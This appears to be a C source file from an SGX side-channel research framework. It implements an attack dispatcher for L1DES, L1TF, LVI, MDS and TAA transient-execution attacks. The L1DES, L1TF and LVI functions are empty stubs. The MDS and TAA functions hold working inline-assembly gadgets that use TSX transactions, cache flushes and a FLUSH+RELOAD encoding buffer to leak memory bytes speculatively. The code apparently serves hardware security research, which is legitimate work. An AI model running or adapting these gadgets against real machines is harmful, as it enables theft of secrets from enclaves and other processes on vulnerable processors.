#include "enclyser/libenclyser/attack.h"

/**
 * @brief the defines and functions that are shared by trusted libraries and untrusted libraries
 * 
 */
#ifdef NAMESPACE_SGX_SHARED

/**
 * @brief Try different variants of the l1des attack.
 * 
 * @param l1des_attack the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void l1des_attack(enclyser_attack_t *l1des_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    /** TODO */
}

/**
 * @brief Try different variants of the l1tf attack.
 * 
 * @param l1tf_attack the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void l1tf_attack(enclyser_attack_t *l1tf_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    /** TODO */
}

/**
 * @brief Try different variants of the lvi attack.
 * 
 * @param lvi_attack the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void lvi_attack(enclyser_attack_t *lvi_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    /** TODO */
}

/**
 * @brief Try different variants of the mds attack.
 * 
 * @param mds_attack the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void mds_attack(enclyser_attack_t *mds_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    switch (mds_attack->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "mfence\n"
            "clflush (%2)\n"    /** TODO seperate the two parts */
            "xbegin 1f\n" 
            "movzbq 0(%0), %%rax\n"
            "shl $6, %%rax\n"   /** TODO calculate 6 in asm code */
            "movzbq (%%rax, %1), %%rax\n"
            "xabort $0\n"
            "xend\n"
            "1:\n"
            :
            : "r"(attaking_buffer->buffer), "r"(encoding_buffer->buffer), "r"(attaking_buffer->shadow)
            : "rax");
        break;
    default:
        break;
    }
}

/**
 * @brief Try different variants of the taa attack.
 * 
 * @param taa_attack the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void taa_attack(enclyser_attack_t *taa_attack, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    switch (taa_attack->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "mfence\n"
            "clflush (%2)\n"
            "sfence\n"
            "clflush (%1)\n"    /** TODO seperate the two parts */
            "xbegin 1f\n" 
            "movzbq 0(%0), %%rax\n"
            "shl $6, %%rax\n"   /** TODO calculate 6 in asm code */
            "movzbq (%%rax, %1), %%rax\n"
            "xabort $0\n"
            "xend\n"
            "1:\n"
            :
            : "r"(attaking_buffer->buffer), "r"(encoding_buffer->buffer), "r"(attaking_buffer->shadow)
            : "rax");
        break;
    default:
        break;
    }
}

void attack(enclyser_attack_t *attack_spec, enclyser_buffer_t *attaking_buffer, enclyser_buffer_t *encoding_buffer)
{
    switch (attack_spec->major)
    {
    case ATTACK_MAJOR_NONE:
        break;
    case ATTACK_MAJOR_L1DES:
        l1des_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_L1TF:
        l1tf_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_LVI:
        lvi_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_MDS:
        mds_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_TAA:
        taa_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    default:
        break;
    }
}

#endif

/**
 * @brief the defines and functions that are exclusive to trusted libraries
 * 
 */
#ifdef NAMESPACE_SGX_YES

#endif

/**
 * @brief the defines and functions that are exclusive to untrusted libraries
 * 
 */
#ifdef NAMESPACE_SGX_NO

#endif